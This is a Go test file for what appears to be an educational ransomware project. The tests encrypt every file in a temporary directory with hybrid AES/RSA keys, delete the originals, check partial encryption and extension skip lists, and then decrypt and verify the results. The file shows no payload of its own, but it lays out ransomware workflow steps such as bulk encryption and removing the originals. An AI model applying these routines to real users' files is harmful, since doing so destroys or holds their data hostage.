package cli

import (
	"bytes"
	"os"
	"path/filepath"
	"testing"

	"github.com/marmos91/ransomware/crypto"
	"github.com/marmos91/ransomware/fs"
)

func setupE2EDir(t *testing.T, files map[string][]byte) (string, map[string][]byte) {
	t.Helper()
	dir := t.TempDir()
	contents := make(map[string][]byte, len(files))
	for name, data := range files {
		createTestFile(t, dir, name, data)
		contents[name] = data
	}
	return dir, contents
}

// encryptAll walks dir, encrypts every collected file, and optionally removes originals.
func encryptAll(t *testing.T, dir string, k testKeys, partial int64, blacklist []string, removeOriginals bool) {
	t.Helper()
	collected, err := fs.WalkAndCollect(dir, blacklist, nil, false, true)
	if err != nil {
		t.Fatalf("walk for encrypt: %v", err)
	}
	for _, path := range collected {
		if err := encryptFile(path, k.AesKey, k.EncryptedAesKey, k.KeySizeBits, partial, ".enc"); err != nil {
			t.Fatalf("encrypt %s: %v", path, err)
		}
		if removeOriginals {
			_ = os.Remove(path)
		}
	}
}

func decryptAll(t *testing.T, dir string, kp *crypto.Keypair) {
	t.Helper()
	encFiles, err := fs.WalkAndCollect(dir, nil, []string{".enc"}, false, true)
	if err != nil {
		t.Fatalf("walk for decrypt: %v", err)
	}
	for _, path := range encFiles {
		if err := decryptFile(path, kp.Private, ".enc"); err != nil {
			t.Fatalf("decrypt %s: %v", path, err)
		}
		_ = os.Remove(path)
	}
}

func verifyOriginals(t *testing.T, dir string, originals map[string][]byte) {
	t.Helper()
	for name, original := range originals {
		path := filepath.Join(dir, name)
		data, err := os.ReadFile(path)
		if err != nil {
			t.Fatalf("read %s: %v", name, err)
		}
		if !bytes.Equal(data, original) {
			t.Fatalf("content mismatch for %s (got %d bytes, want %d)", name, len(data), len(original))
		}
	}
}

func TestE2E_FullRoundTrip(t *testing.T) {
	files := map[string][]byte{
		"doc.txt":        []byte("Hello, world!"),
		"data.bin":       bytes.Repeat([]byte{0xAB}, 1024),
		"sub/nested.txt": []byte("nested content"),
	}

	dir, originals := setupE2EDir(t, files)
	k := setupTestKeys(t)

	encryptAll(t, dir, k, 0, nil, true)

	// Verify all encrypted files exist and are valid.
	encFiles, err := fs.WalkAndCollect(dir, nil, []string{".enc"}, false, true)
	if err != nil {
		t.Fatalf("walk enc: %v", err)
	}
	if len(encFiles) != len(files) {
		t.Fatalf("expected %d encrypted files, got %d", len(files), len(encFiles))
	}
	for _, path := range encFiles {
		if err := verifyFile(path, k.Keypair.Private); err != nil {
			t.Fatalf("verify %s: %v", path, err)
		}
	}

	decryptAll(t, dir, k.Keypair)
	verifyOriginals(t, dir, originals)
}

func TestE2E_PartialEncryption(t *testing.T) {
	largeContent := make([]byte, 4096)
	for i := range largeContent {
		largeContent[i] = byte(i % 256)
	}

	files := map[string][]byte{
		"large.bin": largeContent,
	}

	dir, originals := setupE2EDir(t, files)
	k := setupTestKeys(t)

	encryptAll(t, dir, k, 512, nil, true)
	decryptAll(t, dir, k.Keypair)
	verifyOriginals(t, dir, originals)
}

func TestE2E_ExtensionFiltering(t *testing.T) {
	files := map[string][]byte{
		"keep.txt":     []byte("should be encrypted"),
		"skip.log":     []byte("should be skipped"),
		"also_keep.go": []byte("should be encrypted too"),
	}

	dir, _ := setupE2EDir(t, files)
	k := setupTestKeys(t)

	encryptAll(t, dir, k, 0, []string{".log"}, false)

	// Verify .log file is untouched.
	data, err := os.ReadFile(filepath.Join(dir, "skip.log"))
	if err != nil {
		t.Fatalf("read log: %v", err)
	}
	if string(data) != "should be skipped" {
		t.Fatal("log file should not have been modified")
	}

	// Verify encrypted files were created for others.
	encFiles, err := fs.WalkAndCollect(dir, nil, []string{".enc"}, false, true)
	if err != nil {
		t.Fatalf("walk enc: %v", err)
	}
	if len(encFiles) != 2 {
		t.Fatalf("expected 2 encrypted files, got %d", len(encFiles))
	}
}

func TestE2E_DryRun(t *testing.T) {
	files := map[string][]byte{
		"a.txt": []byte("content a"),
		"b.txt": []byte("content b"),
	}

	dir, originals := setupE2EDir(t, files)
	k := setupTestKeys(t)

	encryptAll(t, dir, k, 0, nil, false)

	// Verify originals still exist and are unchanged.
	verifyOriginals(t, dir, originals)

	// Verify encrypted copies also exist.
	encFiles, err := fs.WalkAndCollect(dir, nil, []string{".enc"}, false, true)
	if err != nil {
		t.Fatalf("walk enc: %v", err)
	}
	if len(encFiles) != len(files) {
		t.Fatalf("expected %d encrypted files, got %d", len(files), len(encFiles))
	}
}
